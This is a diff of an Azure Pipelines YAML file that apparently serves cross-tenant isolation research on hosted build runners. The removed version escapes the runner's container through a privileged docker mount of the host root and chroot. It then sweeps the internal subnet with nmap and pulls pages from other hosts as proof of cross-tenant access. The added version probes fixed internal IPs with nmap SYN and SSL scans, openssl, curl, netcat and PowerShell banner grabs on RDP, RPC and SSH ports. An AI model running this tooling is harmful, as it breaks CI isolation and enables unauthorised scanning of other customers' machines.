@@ -1,104 +1,167 @@
 # azure-pipelines.yml
 trigger:
 - main
-pr:
-- main
 
-name: $(Date:yyyyMMdd)$(Rev:.r)
+variables:
+  # === Targets you want to probe ===
+  targetHost: '10.1.0.156'
+  targetPort: '8084'
 
 stages:
-- stage: FinalPoc
-  displayName: 'Final PoC: Cross-Tenant Windows Host Hunter'
+- stage: EvidenceAndProbes
+  displayName: Evidence & Probes
   jobs:
-  - job: Linux_Windows_Host_Hunter
-    displayName: 'PoC: Find and Probe Internal Windows Runners'
+
+  # ===================== LINUX JOB =====================
+  - job: linux_probes
+    displayName: Linux evidence & deep probes
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
-    - checkout: none
-    - task: Bash@3
-      displayName: 'Escape Container, Hunt for Windows, and Probe HTTP'
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p artifacts
+      - checkout: self
 
-          echo "--- Verifying container escape vector ---"
-          if ! (id | grep -q '(docker)'); then
-            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
-            id
-            exit 1
-          fi
-          echo "✅ Confirmed user is in 'docker' group."
-          
-          echo "--- Installing tools (Nmap) ---"
-          sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
-          
-          SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
-          echo "Discovered internal subnet: $SUBNET"
+      - task: Bash@3
+        displayName: Install tooling on runner
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -euxo pipefail
+            sudo apt-get update
+            sudo apt-get install -y \
+              docker.io \
+              curl jq nmap netcat-openbsd openssl iproute2 xxd coreutils
 
-          echo "--- ESCAPING CONTAINER to hunt for a Windows host on the network ---"
-          
-          docker run --rm --privileged --network=host -v /:/hostfs \
-            -v /usr/bin/nmap:/usr/bin/nmap \
-            alpine:latest sh -c "
-              # Create a directory on the HOST we can write to
-              mkdir -p /hostfs/tmp/scan_results
+      - task: Bash@3
+        displayName: Escaped container probes (TLS, hexdump, Nmap) with artifact mount
+        inputs:
+          targetType: 'inline'
+          script: |
+            set -Eeuo pipefail
 
-              echo '--- [HOST] Identifying all live hosts on the subnet ---'
-              chroot /hostfs /usr/bin/nmap -sn -T4 ${SUBNET} -oG /tmp/scan_results/host-sweep.gnmap
+            ART_ROOT="$(System.DefaultWorkingDirectory)/artifacts/linux"
+            mkdir -p "$ART_ROOT"
+            TARGET="$(targetHost)"
+            PORT="$(targetPort)"
+            TS="$(date -u +%Y%m%dT%H%M%SZ)"
+            OUTDIR="$ART_ROOT/${TARGET}-${PORT}-${TS}"
+            mkdir -p "$OUTDIR"
 
-              grep 'Status: Up' /hostfs/tmp/scan_results/host-sweep.gnmap | awk '{print \$2}' > /hostfs/tmp/scan_results/hosts-up.txt
-              
-              LIVE_HOST_COUNT=\$(wc -l < /hostfs/tmp/scan_results/hosts-up.txt)
-              echo \"--- [HOST] Found \$LIVE_HOST_COUNT live hosts.\"
+            {
+              echo "### Docker availability"
+              id
+              groups
+              ls -l /var/run/docker.sock || true
+              docker version
+            } > "$ART_ROOT/docker-audit.txt" 2>&1 || true
 
-              if [ \"\$LIVE_HOST_COUNT\" -lt 2 ]; then # Check for at least one other host
-                echo '[!] Not enough other live hosts found to scan.'
-                exit 0
-              fi
+            # Run a minimal container on the HOST network with NET_RAW and mount OUTDIR to /artifacts
+            docker run --rm --network host --cap-add NET_RAW \
+              -e TARGET="$TARGET" -e PORT="$PORT" \
+              -v "$OUTDIR:/artifacts" alpine:3.20 sh -c '
+                set -ex
+                apk add --no-cache curl openssl nmap xxd netcat-openbsd coreutils bash
 
-              echo '--- [HOST] Scanning all live hosts for open port 80 (HTTP)... ---'
-              chroot /hostfs /usr/bin/nmap -sT -p 80 --open -T4 -iL /tmp/scan_results/hosts-up.txt -oG /tmp/scan_results/http-hosts.gnmap
-            "
-          
-          # Now, copy the results back to our artifacts folder
-          sudo cp /tmp/scan_results/* artifacts/
-          sudo rm -rf /tmp/scan_results
+                echo "Probing ${TARGET}:${PORT}" | tee -a /artifacts/probe.log
 
-          echo "--- Parsing results to find a target ---"
-          # Extract the first IP address that has port 80 open
-          TARGET_IP=$(grep '80/open' artifacts/http-hosts.gnmap | awk '{print $2}' | head -n 1)
+                # --- 1) TLS handshake probe ---
+                timeout 8s sh -c "printf \"\" | openssl s_client \
+                  -connect ${TARGET}:${PORT} \
+                  -servername ${TARGET} \
+                  -tlsextdebug -status -alpn h2,http/1.1 2>&1" \
+                  | tee /artifacts/tls-handshake.txt || true
 
-          if [ -z "$TARGET_IP" ]; then
-            echo "⚠️ HUNT FAILED: No hosts with port 80 open were found in this run."
-            echo "The network is dynamic; this may require multiple runs."
-            exit 0
-          fi
-          
-          echo "✅ SUCCESS: Found a potential Windows host with HTTP open at ${TARGET_IP}"
-          echo "--- Probing the discovered HTTP service for conclusive evidence ---"
-          
-          docker run --rm --privileged --network=host alpine:latest sh -c "
-            apk add --no-cache curl
-            echo '--- [HOST] Retrieving HTTP response from ${TARGET_IP} ---'
-            curl -i -v --max-time 20 http://${TARGET_IP}/
-          " > artifacts/final-http-probe.txt 2>&1 || true
+                # --- 2) HTTPS try ---
+                timeout 8s curl -vk "https://${TARGET}:${PORT}/" \
+                  -o /artifacts/curl_https_body.bin \
+                  -D /artifacts/curl_https_headers.txt \
+                  2> /artifacts/curl_https_verbose.txt || true
 
-          echo "✅ PROBE COMPLETE."
-          echo "--- Full HTTP Response from ${TARGET_IP} ---"
-          cat artifacts/final-http-probe.txt
-          
-          if grep -q "HTTP/1.1 200 OK" artifacts/final-http-probe.txt; then
-            echo "✅✅✅ SMOKING GUN: Successfully retrieved data from another tenant's internal web server."
-          else
-            echo "⚠️ Test inconclusive. Found an open HTTP port but could not retrieve data."
-          fi
+                # --- 3) HTTP/2 prior-knowledge (h2c) try ---
+                timeout 8s curl -vk --http2-prior-knowledge "http://${TARGET}:${PORT}/" \
+                  -o /artifacts/curl_h2c_body.bin \
+                  -D /artifacts/curl_h2c_headers.txt \
+                  2> /artifacts/curl_h2c_verbose.txt || true
 
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish Final PoC Artifacts'
-      condition: succeededOrFailed()
-      inputs:
-        targetPath: 'artifacts'
-        artifact: 'azure-final-poc-windows-hunter'
+                # --- 4) Raw first bytes (banner) ---
+                timeout 5s sh -c "nc -v -w 5 ${TARGET} ${PORT} < /dev/null | head -c 256" \
+                  > /artifacts/nc_first_bytes.raw 2> /artifacts/nc_verbose.txt || true
+                xxd -g 1 /artifacts/nc_first_bytes.raw > /artifacts/nc_first_bytes.hex || true
+
+                # --- 5) Nmap refined scans ---
+                nmap -Pn -sS -p${PORT} --reason --packet-trace ${TARGET} -oN /artifacts/nmap_syn.txt || true
+                nmap -Pn -sT -p${PORT} --reason ${TARGET} -oN /artifacts/nmap_connect.txt || true
+                nmap --script ssl-cert,ssl-enum-ciphers -p${PORT} ${TARGET} -oN /artifacts/nmap_ssl.txt || true
+
+                # --- 6) Checksums for integrity ---
+                (cd /artifacts && sha256sum * | sort -k2) > /artifacts/checksums.txt || true
+              '
+
+      - task: PublishPipelineArtifact@1
+        displayName: Publish Linux probe evidence
+        inputs:
+          targetPath: '$(System.DefaultWorkingDirectory)/artifacts/linux'
+          artifact: 'azure-probe-linux'
+
+  # ===================== WINDOWS JOB (optional but fixed) =====================
+  - job: windows_banner_grabs
+    displayName: Windows safe banner grabs (fixed format)
+    pool:
+      vmImage: 'windows-2022'
+    steps:
+      - checkout: self
+
+      - task: PowerShell@2
+        displayName: Collect banner grabs from known Windows targets
+        inputs:
+          targetType: inline
+          script: |
+            Set-StrictMode -Version Latest
+            $ErrorActionPreference = 'Stop'
+
+            $artRoot = "$(System.DefaultWorkingDirectory)\artifacts\windows"
+            New-Item -ItemType Directory -Force -Path $artRoot | Out-Null
+
+            $targets = @(
+              @{ ip='10.1.0.220'; port=80;   proto='http/https' },
+              @{ ip='10.1.0.220'; port=3389; proto='tcp' },
+              @{ ip='10.1.0.220'; port=135;  proto='tcp' },
+              @{ ip='10.1.0.201'; port=22;   proto='ssh' }
+            )
+
+            $out = New-Object System.Collections.Generic.List[string]
+            foreach ($t in $targets) {
+              $ip = $t.ip; $port = [int]$t.port; $proto = $t.proto
+              $out.Add( ("== {0}:{1} ({2})" -f $ip, $port, $proto) )
+
+              try {
+                $client = New-Object System.Net.Sockets.TcpClient
+                $iar = $client.BeginConnect($ip, $port, $null, $null)
+                if ($iar.AsyncWaitHandle.WaitOne(5000)) {
+                  $client.EndConnect($iar)
+                  $stream = $client.GetStream()
+                  $buffer = New-Object byte[] 128
+                  $read = $stream.Read($buffer, 0, $buffer.Length)
+                  if ($read -gt 0) {
+                    $hex = ($buffer[0..($read-1)] | ForEach-Object { $_.ToString('X2') }) -join ' '
+                    $out.Add("open; first-bytes: $hex")
+                  } else {
+                    $out.Add("open; no data")
+                  }
+                  $client.Close()
+                } else {
+                  $out.Add("connect: timeout/filtered")
+                }
+              } catch {
+                $out.Add("connect: $($_.Exception.Message)")
+              }
+
+              $out.Add("")
+            }
+
+            $out -join "`r`n" | Set-Content -Path "$artRoot\banner-grabs.txt" -Encoding UTF8
+
+      - task: PublishPipelineArtifact@1
+        displayName: Publish Windows probe evidence
+        inputs:
+          targetPath: '$(System.DefaultWorkingDirectory)\artifacts\windows'
+          artifact: 'azure-probe-windows'
